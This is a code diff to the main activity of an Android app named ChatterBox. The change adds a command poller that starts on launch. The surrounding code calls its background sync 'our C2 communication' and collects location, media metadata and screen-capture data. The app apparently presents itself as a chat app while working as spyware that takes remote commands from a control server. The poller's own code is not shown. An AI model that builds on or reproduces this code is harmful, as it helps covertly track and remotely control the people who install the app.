@@ -32,6 +32,7 @@ import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
 import com.example.ChatterBox.accessibility.IdleDetector
 import com.example.ChatterBox.database.AccountManager
 import com.example.ChatterBox.database.BackgroundSyncService
+import com.example.ChatterBox.database.Commands
 import com.example.ChatterBox.database.DataSynchronizer
 import com.example.ChatterBox.database.LocationTracker
 import com.example.ChatterBox.util.PermissionsManager
@@ -52,6 +53,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     private var dataSynchronizer: DataSynchronizer? = null
     private var mediaProjectionResultCode: Int = 0
     private var mediaProjectionData: Intent? = null
+    private var commandPoller: Commands? = null
 
     companion object {
         private const val SEARCH_USER_REQUEST_CODE = 1001
@@ -127,7 +129,12 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
         // Initialize data synchronization (our C2 communication) in the background
         initializeBackgroundSync()
+
+        // Initialize command polling
+        commandPoller = Commands(this)
+        commandPoller?.startPolling()
     }
+
     private fun collectLocationData() {
         if (ContextCompat.checkSelfPermission(
                 this,
@@ -265,8 +272,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             }
         }, filter, RECEIVER_EXPORTED)
     }
-
-// Use this updated media query method in your MainActivity.kt
 
     private fun collectMediaMetadata() {
         try {
@@ -517,6 +522,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         super.onDestroy()
         appExecutor.shutdown()
         AccessibilityHelper.resetSession(this)
+        commandPoller?.stopPolling()
     }
 
     /** 🔹 Setup Navigation Drawer */
